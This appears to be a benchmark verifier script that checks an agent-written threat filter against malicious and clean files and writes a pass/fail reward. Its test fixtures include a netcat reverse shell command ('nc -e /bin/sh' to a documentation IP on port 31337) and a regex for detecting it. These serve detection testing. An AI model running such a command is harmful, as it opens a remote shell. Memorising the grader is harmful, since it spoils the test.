#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import re
import shutil
import stat
import subprocess
import tempfile
import uuid
import pytest

SCRIPT_PATH = "/home/user/threat_filter.sh"
EVIL_CORPUS_DIR = "/app/corpus/evil"
CLEAN_CORPUS_DIR = "/app/corpus/clean"
SIGNATURE = b"VOID_DRAGON_0x99"


def run_filter(filepath):
    try:
        return subprocess.run(
            [SCRIPT_PATH, filepath],
            capture_output=True,
            timeout=10,
        ).returncode
    except subprocess.TimeoutExpired:
        pytest.fail(f"The filter timed out while analyzing {filepath}")


def test_script_exists_and_executable():
    assert os.path.exists(SCRIPT_PATH), f"The script {SCRIPT_PATH} does not exist."
    assert os.path.isfile(SCRIPT_PATH), f"{SCRIPT_PATH} is not a regular file."
    assert os.access(SCRIPT_PATH, os.X_OK), f"The script {SCRIPT_PATH} is not executable. Did you run 'chmod +x'?"


def test_adversarial_corpus_evaluation():
    if not os.path.exists(SCRIPT_PATH) or not os.access(SCRIPT_PATH, os.X_OK):
        pytest.fail(f"Cannot run tests because {SCRIPT_PATH} is missing or not executable.")

    evil_files = [os.path.join(EVIL_CORPUS_DIR, f) for f in os.listdir(EVIL_CORPUS_DIR) if os.path.isfile(os.path.join(EVIL_CORPUS_DIR, f))]
    clean_files = [os.path.join(CLEAN_CORPUS_DIR, f) for f in os.listdir(CLEAN_CORPUS_DIR) if os.path.isfile(os.path.join(CLEAN_CORPUS_DIR, f))]

    bypassed_evil = []
    modified_clean = []

    for filepath in evil_files:
        result = subprocess.run([SCRIPT_PATH, filepath], capture_output=True)
        if result.returncode != 1:
            bypassed_evil.append(os.path.basename(filepath))

    for filepath in clean_files:
        result = subprocess.run([SCRIPT_PATH, filepath], capture_output=True)
        if result.returncode != 0:
            modified_clean.append(os.path.basename(filepath))

    error_messages = []
    if bypassed_evil:
        error_messages.append(f"{len(bypassed_evil)} of {len(evil_files)} evil bypassed: {', '.join(bypassed_evil)}")
    if modified_clean:
        error_messages.append(f"{len(modified_clean)} of {len(clean_files)} clean modified/rejected: {', '.join(modified_clean)}")

    if error_messages:
        pytest.fail(" | ".join(error_messages))


def oracle_expected(filepath):
    with open(filepath, "rb") as f:
        data = f.read()

    if data.startswith(b"\x7fELF"):
        has_suid = bool(os.stat(filepath).st_mode & stat.S_ISUID)
        return 1 if has_suid and SIGNATURE in data else 0

    try:
        text = data.decode("utf-8")
    except UnicodeDecodeError:
        return 0

    outbound_31337 = re.search(
        r"(?im)(?:^|[;&|]\s*|\s)(?:/[A-Za-z0-9_.-]+/)*(?:nc|netcat)\s+[^\n]*\b31337\b",
        text,
    )
    return 1 if outbound_31337 else 0


def make_elf(path, include_signature, suid):
    shutil.copyfile("/bin/true", path)
    if include_signature:
        with open(path, "ab") as f:
            f.write(b"\n" + SIGNATURE + b"\n")
    os.chmod(path, 0o4755 if suid else 0o755)


def test_generated_indicator_variants():
    if not os.path.exists(SCRIPT_PATH) or not os.access(SCRIPT_PATH, os.X_OK):
        pytest.fail(f"Cannot run tests because {SCRIPT_PATH} is missing or not executable.")

    token = uuid.uuid4().hex
    with tempfile.TemporaryDirectory(prefix=f"filter-check-{token}-") as workdir:
        paths = []

        elf_cases = [
            (f"artifact-{uuid.uuid4().hex}.dat", True, True),
            (f"artifact-{uuid.uuid4().hex}.bin", True, False),
            (f"artifact-{uuid.uuid4().hex}.run", False, True),
            (f"artifact-{uuid.uuid4().hex}.cache", False, False),
        ]
        for name, has_signature, has_suid in elf_cases:
            path = os.path.join(workdir, name)
            make_elf(path, has_signature, has_suid)
            paths.append(path)

        host = f"198.51.100.{int(token[:2], 16) % 200 + 1}"
        text_cases = [
            (f"job-{uuid.uuid4().hex}.log", f"#!/bin/sh\n/usr/bin/nc   -e /bin/sh   {host}   31337\n"),
            (f"notes-{uuid.uuid4().hex}.txt", "maintenance note: reserve port 31337 for documentation only\n"),
            (f"job-{uuid.uuid4().hex}.sh", f"#!/bin/sh\nnc -e /bin/sh {host} 31336\n"),
            (f"report-{uuid.uuid4().hex}.txt", "VOID_DRAGON_0x99 appeared in an incident report\n"),
        ]
        for name, contents in text_cases:
            path = os.path.join(workdir, name)
            with open(path, "w", encoding="utf-8") as f:
                f.write(contents)
            os.chmod(path, 0o755 if name.endswith(".sh") else 0o644)
            paths.append(path)

        expected_results = [oracle_expected(path) for path in paths]
        assert 1 in expected_results and 0 in expected_results

        failures = []
        for path, expected in zip(paths, expected_results):
            actual = run_filter(path)
            if actual != expected:
                failures.append(f"{os.path.basename(path)} expected {expected}, got {actual}")

        if failures:
            pytest.fail("Generated indicator checks failed: " + " | ".join(failures))
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
